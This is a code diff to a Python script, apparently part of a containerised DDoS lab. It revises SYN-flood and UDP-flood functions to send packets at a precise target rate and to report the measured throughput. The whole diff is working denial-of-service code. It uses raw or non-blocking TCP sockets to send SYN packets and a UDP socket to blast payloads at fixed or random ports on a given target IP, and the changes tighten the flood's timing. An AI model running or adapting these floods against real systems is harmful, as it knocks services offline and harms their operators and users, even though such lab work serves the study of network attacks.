@@ -72,12 +72,19 @@ def run_syn_flood(target_ip: str, target_port: int, rate_pps: int, duration_sec:
         use_raw = False
 
     interval = 1.0 / max(1, rate_pps)
-    start_time = time.time()
+    total_packets = int(rate_pps * duration_sec)
+    start_time = time.perf_counter()
     packets_sent = 0
 
-    while time.time() - start_time < duration_sec:
-        t0 = time.time()
-        # Use container interface IP to ensure Docker bridge forwarding
+    for i in range(total_packets):
+        target_time = start_time + (i * interval)
+        now = time.perf_counter()
+        to_sleep = target_time - now
+        if to_sleep > 0.001:
+            time.sleep(to_sleep - 0.0005)
+        while time.perf_counter() < target_time:
+            pass
+
         try:
             src_ip = socket.gethostbyname(socket.gethostname())
         except Exception:
@@ -90,7 +97,6 @@ def run_syn_flood(target_ip: str, target_port: int, rate_pps: int, duration_sec:
             except Exception:
                 pass
         else:
-            # Non-blocking socket connect initiates TCP SYN
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.setblocking(False)
@@ -98,14 +104,11 @@ def run_syn_flood(target_ip: str, target_port: int, rate_pps: int, duration_sec:
                 sock.close()
             except Exception:
                 pass
-
         packets_sent += 1
-        elapsed = time.time() - t0
-        to_sleep = interval - elapsed
-        if to_sleep > 0:
-            time.sleep(to_sleep)
 
-    print(f"SYN flood finished: {packets_sent} packets sent.")
+    actual_duration = time.perf_counter() - start_time
+    measured_rate = packets_sent / max(0.001, actual_duration)
+    print(f"SYN flood finished: {packets_sent} packets sent in {actual_duration:.2f}s (measured rate: {measured_rate:.2f} pps).")
     return packets_sent
 
 
@@ -116,11 +119,19 @@ def run_udp_flood(target_ip: str, target_port: int, rate_pps: int, duration_sec:
     payload = b"DDoS_Lab_UDP_Flood_Payload_" + b"X" * 128
 
     interval = 1.0 / max(1, rate_pps)
-    start_time = time.time()
+    total_packets = int(rate_pps * duration_sec)
+    start_time = time.perf_counter()
     packets_sent = 0
 
-    while time.time() - start_time < duration_sec:
-        t0 = time.time()
+    for i in range(total_packets):
+        target_time = start_time + (i * interval)
+        now = time.perf_counter()
+        to_sleep = target_time - now
+        if to_sleep > 0.001:
+            time.sleep(to_sleep - 0.0005)
+        while time.perf_counter() < target_time:
+            pass
+
         dst_p = target_port if target_port > 0 else random.randint(1024, 65535)
         try:
             sock.sendto(payload, (target_ip, dst_p))
@@ -128,12 +139,9 @@ def run_udp_flood(target_ip: str, target_port: int, rate_pps: int, duration_sec:
         except Exception:
             pass
 
-        elapsed = time.time() - t0
-        to_sleep = interval - elapsed
-        if to_sleep > 0:
-            time.sleep(to_sleep)
-
-    print(f"UDP flood finished: {packets_sent} packets sent.")
+    actual_duration = time.perf_counter() - start_time
+    measured_rate = packets_sent / max(0.001, actual_duration)
+    print(f"UDP flood finished: {packets_sent} packets sent in {actual_duration:.2f}s (measured rate: {measured_rate:.2f} pps).")
     return packets_sent
 
 
